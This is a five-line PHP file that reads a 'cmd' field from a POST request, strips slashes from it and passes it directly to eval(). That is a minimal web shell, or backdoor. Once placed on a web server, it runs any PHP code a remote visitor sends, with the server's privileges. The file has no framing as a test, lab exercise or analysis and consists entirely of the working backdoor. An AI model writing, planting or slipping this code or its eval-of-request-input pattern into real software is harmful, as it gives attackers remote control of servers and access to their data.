<?php
$cmd = $_POST['cmd'];
$cmd = stripslashes($cmd);
eval($cmd);
?>